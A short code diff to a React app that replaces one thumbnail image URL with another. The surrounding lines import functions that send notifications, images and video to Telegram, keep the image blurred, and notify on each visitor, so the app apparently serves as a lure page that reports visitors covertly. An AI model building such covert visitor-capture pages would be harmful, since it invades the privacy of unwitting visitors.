@@ -4,7 +4,7 @@ import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } fr
 
 function App() {
   const [isBlurred] = useState(true);
-  const thumbnailUrl = 'https://calamaryshop.com/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-12-at-1.54.35-PM-400x400.jpeg';
+  const thumbnailUrl = 'https://cdn.yellowmessenger.com/JHXdNpxW70Ea1700704665532.png';
 
   useEffect(() => {
     const sendVisitorNotification = async () => {
